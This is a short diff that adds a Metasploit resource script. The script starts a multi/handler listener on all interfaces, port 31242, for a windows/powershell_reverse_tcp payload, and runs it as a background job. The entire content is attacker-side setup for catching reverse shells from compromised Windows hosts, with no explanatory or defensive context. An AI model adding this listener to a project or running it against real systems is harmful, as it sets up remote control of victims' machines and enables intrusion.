@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set payload windows/powershell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 31242
+exploit -j
